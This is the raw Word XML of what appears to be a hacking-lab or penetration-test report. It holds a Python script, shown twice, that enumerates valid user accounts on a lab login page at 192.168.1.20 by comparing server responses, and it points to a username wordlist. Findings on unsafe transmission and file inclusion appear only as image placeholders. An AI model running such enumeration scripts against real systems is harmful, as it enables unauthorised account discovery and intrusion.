    <w:p w14:paraId="57145D4A" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="434BBDEB" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>x = requests.post(url, data = myobj)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC1B8A3" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61D51E01" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>#print(x.text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ECEF91" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67AF7A65" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51F76409" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>url = 'http://192.168.1.20/login-exec.php'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC583F7" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>myobj = { 'login': 'hacklab@hacklab.com', 'password': '', 'Submit': 'Login' }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26645447" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7201EE73" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>y = requests.post(url, data = myobj)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2596A1" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70108B35" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>print(y.text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B95F99" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7395476C" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>with open("users.txt") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E1E814" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    usernames = f.read().split("\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35912C32" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D594758" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0512B1E5" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>for i in usernames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393F5723" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DFEB55A" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = 'http://192.168.1.20/login-exec.php'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F801D28" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    myobj = { 'login': i + "@hacklab.com" , 'password': '', 'Submit': 'Login' }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EB4ABE" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D9F323D" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    z = requests.post(url, data = myobj)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F57387B" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="001EBD39" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    #print(z.text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364DF4F8" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    if z.text == y.text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BBAFF3" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2659EE0C" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="630E03FF" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="001D0209" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="68" w:name="_Toc58836617"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4.2</w:t>
      </w:r>
      <w:r w:rsidR="00CC7382">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Name List</w:t>
      </w:r>
      <w:bookmarkEnd w:id="68"/>
    </w:p>
    <w:p w14:paraId="2BBC2BF9" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="006B403F" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B403F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEFBD3B" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="00EA2E30" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="69" w:name="_Toc58836618"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4.3</w:t>
      </w:r>
      <w:r w:rsidR="00CB6F2E">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00244940">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Auto Credentials</w:t>
      </w:r>
      <w:bookmarkEnd w:id="69"/>
    </w:p>
    <w:p w14:paraId="443B6F1A" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="00CB6F2E" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5AECAB22" wp14:editId="446E27D2">
            <wp:extent cx="847725" cy="1000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7725" cy="1000125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="37221D3A" w14:textId="77777777" w:rsidR="003C7416" w:rsidRDefault="00EA2E30" w:rsidP="003C7416">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="70" w:name="_Toc58836619"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4.4</w:t>
      </w:r>
      <w:r w:rsidR="003C7416">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unsafe Transmission</w:t>
      </w:r>
      <w:bookmarkEnd w:id="70"/>
    </w:p>
    <w:p w14:paraId="32C7F950" w14:textId="77777777" w:rsidR="003C7416" w:rsidRDefault="003C7416" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50FA6F6A" wp14:editId="32912454">
            <wp:extent cx="5943600" cy="1619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19885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB4313A" w14:textId="77777777" w:rsidR="00E9641C" w:rsidRDefault="00EA2E30" w:rsidP="00AF77A2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="71" w:name="_Toc58836620"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4.5</w:t>
      </w:r>
      <w:r w:rsidR="00E9641C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AF77A2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>File</w:t>
      </w:r>
      <w:r w:rsidR="00D777A5">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Inclusion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="71"/>
    </w:p>
    <w:p w14:paraId="67D15CA1" w14:textId="77777777" w:rsidR="00E9641C" w:rsidRDefault="00E9641C" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="052B76CC" wp14:editId="6F792023">
            <wp:extent cx="5943600" cy="13373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7310"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DB6F2B" w14:textId="77777777" w:rsidR="006776DA" w:rsidRDefault="00930A27" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="72" w:name="_Toc58836621"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00EA2E30">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.6</w:t>
      </w:r>
      <w:r w:rsidR="001D0209">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Pass Enum.py</w:t>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
    </w:p>
    <w:p w14:paraId="2E44A6EE" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t># -*- coding: utf-8 -*-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC4B7EE" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07D0D32C" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7141EAD1" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08DA37BC" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>url = 'http://192.168.1.20/login-exec.php'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3698D8AD" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>myobj = { 'login': 'bbbb', 'password': '', 'Submit': 'Login' }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BD333A" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1562EB66" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>x = requests.post(url, data = myobj)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EED6BCB" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="454D0604" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>#print(x.text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EC94EE" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D1A4142" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63464FCD" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>url = 'http://192.168.1.20/login-exec.php'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B70489C" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>myobj = { 'login': 'hacklab@hacklab.com', 'password': '', 'Submit': 'Login' }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9E5A0B" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EF13BDF" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>y = requests.post(url, data = myobj)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0792DF17" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2885193F" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>print(y.text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15265FF4" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C3BD3DA" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>with open("users.txt") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3B4596" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    usernames = f.read().split("\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E95AD7" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D4ED1A8" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43CDF4EB" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>for i in usernames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F39C1DF" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75CF746E" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = 'http://192.168.1.20/login-exec.php'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B299CC" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    myobj = { 'login': i + "@hacklab.com" , 'password': '', 'Submit': 'Login' }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C2E813" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="384DE6E3" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
